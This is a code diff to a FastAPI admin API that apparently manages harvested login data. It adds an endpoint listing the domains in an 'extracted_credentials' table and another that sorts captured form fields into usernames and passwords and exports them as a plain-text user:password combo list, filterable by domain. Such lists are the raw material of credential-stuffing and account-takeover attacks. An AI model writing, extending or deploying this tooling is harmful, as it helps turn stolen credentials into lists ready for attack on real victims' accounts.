@@ -1,4 +1,5 @@
 from fastapi import APIRouter, HTTPException, Query, Depends, status
+from fastapi.responses import PlainTextResponse
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from typing import Optional, List
 import os
@@ -302,4 +303,67 @@ async def update_credential(cred_id: int, updates: dict, token: str = Depends(ve
         raise
     except Exception as e:
         logger.error(f"ADMIN_PATCH_CRED_ERROR: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+@router.get("/domains")
+async def list_domains(token: str = Depends(verify_token)):
+    """Return a sorted list of distinct domains present in extracted_credentials."""
+    try:
+        response = supabase_audit.table("extracted_credentials").select("domain").execute()
+        if not response.data:
+            return {"domains": []}
+        domains = sorted(set(row["domain"] for row in response.data if row.get("domain")))
+        return {"domains": domains}
+    except Exception as e:
+        logger.error(f"ADMIN_GET_DOMAINS_ERROR: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+@router.get("/accounts/export", response_class=PlainTextResponse)
+async def export_accounts(
+    domain: Optional[str] = None,
+    token: str = Depends(verify_token)
+):
+    """
+    Export correlated accounts as a plain-text combo list (user:password per line).
+    Optionally filter by domain.
+    """
+    try:
+        query = supabase_audit.table("extracted_credentials").select("*").order("timestamp", desc=True)
+        if domain and domain != "ALL":
+            query = query.ilike("domain", f"%{domain}%")
+
+        response = query.execute()
+        if not response.data:
+            return PlainTextResponse("")
+
+        # Group by capture_id
+        capture_groups = {}
+        for cred in response.data:
+            cid = cred["audit_capture_id"]
+            if cid not in capture_groups:
+                capture_groups[cid] = {"domain": cred["domain"], "fields": {}}
+            capture_groups[cid]["fields"][cred["field_name"].lower()] = cred["field_value"]
+
+        user_keys = ['user', 'email', 'login', 'id', 'account', 'phone']
+        pass_keys = ['pass', 'pwd', 'secret']
+
+        unique_accounts = {}
+        for cid, data in capture_groups.items():
+            user = "Unknown"
+            password = "Unknown"
+            for k, v in data["fields"].items():
+                if any(pk in k for pk in pass_keys):
+                    password = v
+                elif any(uk in k for uk in user_keys):
+                    user = v
+            key = f"{data['domain'].lower()}|{user.lower()}|{password}"
+            if key not in unique_accounts:
+                unique_accounts[key] = f"{user}:{password}"
+
+        lines = list(unique_accounts.values())
+        return PlainTextResponse("\n".join(lines))
+    except Exception as e:
+        logger.error(f"ADMIN_EXPORT_ACCOUNTS_ERROR: {str(e)}")
         raise HTTPException(status_code=500, detail=str(e))
